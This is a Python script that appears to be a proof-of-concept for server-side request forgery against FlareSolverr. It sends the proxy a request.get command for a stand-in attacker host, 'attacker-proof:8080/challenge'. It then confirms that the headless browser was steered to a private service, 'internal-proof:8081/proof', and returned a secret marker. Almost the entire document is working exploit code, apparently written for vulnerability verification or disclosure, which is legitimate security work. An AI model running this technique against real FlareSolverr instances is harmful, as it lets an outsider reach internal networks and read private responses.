import json
import time
import urllib.error
import urllib.request

endpoint = "http://127.0.0.1:8191/v1"
payload = {
    "cmd": "request.get",
    "url": "http://attacker-proof:8080/challenge",
    "maxTimeout": 60000,
}

for attempt in range(40):
    try:
        req = urllib.request.Request(
            endpoint,
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=75) as response:
            result = json.load(response)
        break
    except (urllib.error.URLError, TimeoutError):
        if attempt == 39:
            raise
        time.sleep(3)
else:
    raise RuntimeError("FlareSolverr did not become ready")

solution = result.get("solution") or {}
html = solution.get("response") or ""
final_url = solution.get("url") or ""
print("FlareSolverr status:", result.get("status"))
print("Browser final URL:", final_url)
print("Private response marker present:", "INTERNAL_ONLY_PROOF_MARKER_7f31c9" in html)

if result.get("status") != "ok":
    raise SystemExit("FAIL: FlareSolverr did not complete the browser navigation")
if "internal-proof:8081/proof" not in final_url:
    raise SystemExit("FAIL: browser did not navigate to the private test service")
if "INTERNAL_ONLY_PROOF_MARKER_7f31c9" not in html:
    raise SystemExit("FAIL: private response was not returned by FlareSolverr")

print("PASS: browser navigated from the challenge page to the private test service and returned its response")
